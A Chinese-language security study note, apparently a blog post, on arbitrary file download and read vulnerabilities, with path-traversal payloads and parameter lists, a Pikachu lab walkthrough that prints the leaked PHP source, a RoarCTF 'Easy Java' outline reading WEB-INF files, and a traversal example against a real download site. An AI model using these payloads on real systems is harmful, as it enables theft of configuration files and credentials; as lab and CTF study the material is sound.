---
title: "网安笔记 - web漏洞 - 文件下载&读取"
category: "网安笔记"
date: 2025-11-01
published: 2025-11-01
author: "Rin"
---

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1628991158390-b5543660-8083-4e31-9a9d-16edbbf6a1f0.png?x-oss-process=image%2Fresize%2Cw_1500)

```
文件下载，读取 原理，检测，利用，修复等  

#利用
数据库配置文件下载或读取后续
接口密匙信息文件下载或读取后续
#文件名，参数值，目录符号
read.xxx?filename=
down.xxx?filename=
readfile.xxx?file=
downfile.xxx?file=
../ ..\ .\ ./等
%00 ? %23 %20 .等
&readpath=、&filepath=、&path=、&inputfile=、&url=、&data=、&readfile=、&menu=、META-INF= 、
WEB-INF

1.文件被解析，则是文件包含漏洞
2.显示源代码，则是文件读取漏洞
3.提示文件下载，则是文件下载漏洞


下载或文件读取漏洞：
对应文件：配置文件（数据库，平台，各种等）

#各种协议调用配合
```

### pikachu文件下载漏洞

正常下载文件获取地址以科比的地址为例

```
http://10.1.1.7/vul/unsafedownload/execdownload.php?filename=kb.png

正常看到的是传递的参数filename=kb.png获取指定下载的文件地址，要是我们更改下载的文件地址就会形成文件下载漏洞

http://10.1.1.7/vul/unsafedownload/download/kb.png
这个是网站的存储的文件地址

通过上面的两个下载的地址我们可以可以测试文件下载漏洞
http://10.1.1.7/vul/unsafedownload/execdownload.php?filename=../execdownload.php
```

根据上面的分析通过链接下载到了文件`execdownload.php`

```
<?php


$PIKA_ROOT_DIR =  "../../";

include_once $PIKA_ROOT_DIR."inc/function.php";

header("Content-type:text/html;charset=utf-8");
// $file_name="cookie.jpg";
$file_path="download/{$_GET['filename']}";
//用以解决中文不能显示出来的问题
$file_path=iconv("utf-8","gb2312",$file_path);

//首先要判断给定的文件存在与否
if(!file_exists($file_path)){
    skip("你要下载的文件不存在，请重新下载", 'unsafe_down.php');
    return ;
}
$fp=fopen($file_path,"rb");
$file_size=filesize($file_path);
//下载文件需要用到的头
ob_clean();//输出前一定要clean一下，否则图片打不开
Header("Content-type: application/octet-stream");
Header("Accept-Ranges: bytes");
Header("Accept-Length:".$file_size);
Header("Content-Disposition: attachment; filename=".basename($file_path));
$buffer=1024;
$file_count=0;
//向浏览器返回数据

//循环读取文件流,然后返回到浏览器feof确认是否到EOF
while(!feof($fp) && $file_count<$file_size){

    $file_con=fread($fp,$buffer);
    $file_count+=$buffer;

    echo $file_con;
}
fclose($fp);
?>
```

根据我们上面下载的代码进行测试我们可以看到的是里面有个inc/function.php文件，试着构造URL下载。`[http://10.1.1.7/vul/unsafedownload/execdownload.php?filename=../../../inc/function.php](http://10.1.1.7/vul/unsafedownload/execdownload.php?filename=../../../inc/function.php)`

```
<?php 
//验证码
function vcode($width=120,$height=40,$fontSize=30,$countElement=5,$countPixel=100,$countLine=4){
	header('Content-type:image/jpeg');
	$element=array('a','b','c','d','e','f','g','h','i','j','k','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9');
	$string='';
	for ($i=0;$i<$countElement;$i++){
		$string.=$element[rand(0,count($element)-1)];
	}
	$img=imagecreatetruecolor($width, $height);
	$colorBg=imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));
	$colorBorder=imagecolorallocate($img,rand(200,255),rand(200,255),rand(200,255));
	$colorString=imagecolorallocate($img,rand(10,100),rand(10,100),rand(10,100));
	imagefill($img,0,0,$colorBg);
	for($i=0;$i<$countPixel;$i++){
		imagesetpixel($img,rand(0,$width-1),rand(0,$height-1),imagecolorallocate($img,rand(100,200),rand(100,200),rand(100,200)));
	}
	for($i=0;$i<$countLine;$i++){
		imageline($img,rand(0,$width/2),rand(0,$height),rand($width/2,$width),rand(0,$height),imagecolorallocate($img,rand(100,200),rand(100,200),rand(100,200)));
	}
	//imagestring($img,5,0,0,'abcd',$colorString);
	imagettftext($img,$fontSize,rand(-5,5),rand(5,15),rand(30,35),$colorString,'../assets/fonts/ManyGifts.ttf',$string);
	imagejpeg($img);
	imagedestroy($img);
	return $string;
}

//之前的验证码有点问题，重新从网上搜了一个简单的验证码函数，是的，从网上搜的。
function vcodex(){
	
	$string = "abcdefghijklmnopqrstuvwxyz0123456789";
    	$str = "";
    	for($i=0;$i<6;$i++){
        	$pos = rand(0,35);
        	$str .= $string{$pos};
    	}
    //session_start();
    //$_SESSION['img_number'] = $str;
	
	$img_handle = Imagecreate(80, 20);  //图片大小80X20
    	$back_color = ImageColorAllocate($img_handle, 255, 255, 255); //背景颜色（白色）
    	$txt_color = ImageColorAllocate($img_handle, 0,0, 0);  //文本颜色（黑色）
    
    //加入干扰线
    	for($i=0;$i<3;$i++)
    	{
        	$line = ImageColorAllocate($img_handle,rand(0,255),rand(0,255),rand(0,255));
        	Imageline($img_handle, rand(0,15), rand(0,15), rand(100,150),rand(10,50), $line);
    	}
    //加入干扰象素
    	for($i=0;$i<200;$i++) 
    	{
        	$randcolor = ImageColorallocate($img_handle,rand(0,255),rand(0,255),rand(0,255));
        	Imagesetpixel($img_handle, rand()%100 , rand()%50 , $randcolor);
    	}
	
	Imagefill($img_handle, 0, 0, $back_color);             //填充图片背景色
    	ImageString($img_handle, 28, 10, 0, $str, $txt_color);//水平填充一行字符串
	
	ob_clean();   // ob_clean()清空输出缓存区    
    	header("Content-type: image/png"); //生成验证码图片    
    	Imagepng($img_handle);//显示图片
	return $str;
	
}


//生成一个token,以当前微妙时间+一个5位的前缀
function set_token(){
    if(isset($_SESSION['token'])){
       unset($_SESSION['token']);
    }
    $_SESSION['token']=str_replace('.','',uniqid(mt_rand(10000,99999),true));
}




//跳转页面
function skip($notice,$url){
$html=<<<A
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="refresh" content="2;URL={$url}" />
<title>notice</title>
<link rel="stylesheet" type="text/css" href="../../../style/header.css"/>
</head>
<body>
<p id='op_notice'>{$notice} | <a href='{$url}'>点击快速返回</a></p>
</body>
</html>
A;
echo $html;
exit();
}

//在访问一个页面时，先验证是否登录,csrf里面，使用的是session验证
function check_csrf_login($link){
    if(isset($_SESSION['csrf']['username']) && isset($_SESSION['csrf']['password'])){
        $query="select * from member where username='{$_SESSION['csrf']['username']}' and sha1(pw)='{$_SESSION['csrf']['password']}'";
        $result=execute($link,$query);
        if(mysqli_num_rows($result)==1){
            return true;
        }else{
            return false;
        }
    }else{
        return false;
    }
}


//在访问一个页面时，先验证是否登录,sqli的insert,update问题里面，使用的是session验证
function check_sqli_session($link){
    if(isset($_SESSION['sqli']['username']) && isset($_SESSION['sqli']['password'])){
        $query="select * from member where username='{$_SESSION['sqli']['username']}' and sha1(pw)='{$_SESSION['sqli']['password']}'";
        $result=execute($link,$query);
        if(mysqli_num_rows($result)==1){
            return true;
        }else{
            return false;
        }
    }else{
        return false;
    }
}


//在访问一个页面时，先验证是否登录,sqli里面，使用的是cookie验证
function check_sqli_login($link){
    if(isset($_COOKIE['ant']['uname']) && isset($_COOKIE['ant']['pw'])){
        //这里如果不对获取的cookie进行转义，则会存在SQL注入漏洞，也会导致验证被绕过
        //$username=escape($link, $_COOKIE['ant']['username']);
        //$password=escape($link, $_COOKIE['ant']['password']);
        $username=$_COOKIE['ant']['uname'];
        $password=$_COOKIE['ant']['pw'];


        $query="select * from users where username='$username' and sha1(password)='$password'";

        $result=execute($link,$query);
        if(mysqli_num_rows($result)==1){
            $data=mysqli_fetch_assoc($result);
            return $data['id'];
        }else{
            return false;
        }
    }else{
        return false;
    }
}

/*xss里面的logincheck*/
function check_xss_login($link){
    if(isset($_COOKIE['ant']['uname']) && isset($_COOKIE['ant']['pw'])){
        //这里如果不对获取的cookie进行转义，则会存在SQL注入漏洞，也会导致验证被绕过
        $username=escape($link, $_COOKIE['ant']['uname']);
        $password=escape($link, $_COOKIE['ant']['pw']);
//         $username=$_COOKIE['ant']['uname'];
//         $password=$_COOKIE['ant']['pw'];
        $query="select * from users where username='$username' and sha1(password)='$password'";
        $result=execute($link,$query);
        if(mysqli_num_rows($result)==1){
            $data=mysqli_fetch_assoc($result);
            return $data['id'];
        }else{
            return false;
        }
    }else{
        return false;
    }
}
/*op1的check login*/
function check_op_login($link){
    if(isset($_SESSION['op']['username']) && isset($_SESSION['op']['password'])){
        $query="select * from member where username='{$_SESSION['op']['username']}' and sha1(pw)='{$_SESSION['op']['password']}'";
        $result=execute($link,$query);
        if(mysqli_num_rows($result)==1){
            return true;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

/*op2的check login*/
function check_op2_login($link){
    if(isset($_SESSION['op2']['username']) && isset($_SESSION['op2']['password'])){
        $query="select * from users where username='{$_SESSION['op2']['username']}' and sha1(password)='{$_SESSION['op2']['password']}'";
        $result=execute($link,$query);
        if(mysqli_num_rows($result)==1){
            return true;
        }else{
            return false;
        }
    }else{
        return false;
    }
}
?>
```

### webpath后台扫描

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629118072413-aead5aeb-2384-441c-8cb9-536f646e2f63.png)

类似我们可以加载一些大的字典然后去扫描这样获取到更多的路径增加更多的几率,打开几个地址试试

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629118105539-30c959f6-87d5-4b80-8324-c2aee0f70b60.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629118133849-a77073be-772a-48ad-b83a-6b59c91151fb.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629118165950-4b4c70c4-4eec-481a-8bf6-f0a2893b0433.png)

### [http://down.znds.com/](http://down.znds.com/)

文件下载漏洞

```
http://down.znds.com/getdownurl/?s=L2Rvd24vMjAyMTA4MDYvdHhzcDE2MTU4XzcuOC4wLjEwMDVfZGFuZ2JlaS5hcGs=
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629119835972-144756e1-da27-42cd-b068-24ca7ba3be5f.png)

真实的下载地址[http://down.znds.com/getdownurl/?s=](http://down.znds.com/getdownurl/?s=)/down/20210806/txsp16158_7.8.0.1005_dangbei.apk

  

更换下载地址也就存在了文件下载漏洞

### buuojCTF

[https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java](https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629166747366-8a78065b-6de2-4912-bb46-61431409ce14.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629166340123-ca9a144b-1109-481d-a3b2-989878e4ad8e.png)

```
爬虫扫描地址-分析参数名参数值-文件操作安全-对应脚本

修改提交方式测试-读取 WEB 配置文件 WEB-INF/web.xml

访问读取对应地址-访问读取 flag 对应 class 文件-（WEB-INF/classes/com/wm/ctf/FlagController.class）
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629167073478-33839a6b-fb38-4361-b91c-1a745e564f51.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629167924060-3b42f93b-cb5f-463f-8000-55b67a2d6be5.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629167981350-1141b622-f239-47ea-918f-f2c339970bc3.png)

由于网站的原因后面的题没办法做

### 小米路由器

[https://www.seebug.org/vuldb/ssvid-98122](https://www.seebug.org/vuldb/ssvid-98122)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1629175752031-6ee92ccd-4513-4134-84a7-dce2255a7668.png)